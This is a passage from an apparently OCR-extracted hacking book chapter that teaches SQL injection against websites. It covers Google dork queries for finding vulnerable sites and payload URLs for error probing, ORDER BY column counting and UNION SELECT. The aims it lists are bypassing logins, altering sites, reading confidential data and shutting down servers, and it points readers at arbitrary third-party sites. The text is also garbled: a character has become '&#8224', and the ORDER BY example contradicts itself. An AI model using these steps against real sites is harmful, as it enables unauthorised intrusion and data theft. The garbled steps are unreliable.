  md: '# Chapter 5: Hacking a Website Using SQL and PHP Scripting


    # What is SQL Injection?


    SQL injection is a famous and widely used method for hacking. This method lets
    an unauthorised person access the website''s database. With this, the attacker
    gets access to all the data from the website''s database.


    With SQL injection the attacker can


    +   - Bypass logins

    - Modify the contents of the website

    - Access confidential data

    - Can shut down the MySQL server


    You can implement SQL injection with the following steps


    Step 1: Finding Vulnerable Website:


    You can find some vulnerable websites with the help of Google Dork list. Google
    Dork constantly searches for websites that are vulnerable using their searching
    tricks. You can find a number of tricks to search in Google.


    Here, for finding websites that are vulnerable, we will use the "inurl: command.


    Below mentioned are a few examples


    ```

    inurl:index.php?id=

    inurl:gallery.php?id=

    inurl:article.php?id=

    inurl:pageid=

    ```


    How to use?


    You will get a list of websites when you copy any of the above commands and paste
    them in Google. Then you will have to check the vulnerability of each website
    by visiting them one by one.'
  merge: -1
  img_proc: true
- pgno: 29
  md: '1). Check for vulnerability


    Let us say that there is a site which is vulnerable. And looks like

    the site below.


    http://www.site.com/news.php?id=5


    You can check if the site is vulnerable by adding the end of url. For

    example


    That would be http://www.site.com/news.php?id=5&#8224


    You can say that the site is vulnerable when you get an error

    message which looks like "You have an error in your SQL syntax;

    check the manual that corresponds to your MySQL server version

    for the right etc..." or something similar to that.


    2).Finding number of columns


    We use the statement ORDER BY to find the number of columns.

    We can just try increasing the number till we get an error.


    http://www.site.com/news.php?id=5 order by 1/* <- no error


    http://www.site.com/news.php?id=5 order by 2/* <- no error


    http://www.site.com/news.php?id=5 order by 3/* <- no error


    http://www.site.com/news.php?id=5 order by 4/* <- no error


    In the above trials we got an error in the fourth try. It means that it

    has got 3 columns.


    3).Checking UNION function


    For selecting more data in a single SQL statement you can use the

    UNION function.


    http://www.site.com/news.php?id=5 union all select 1,2,3/*'
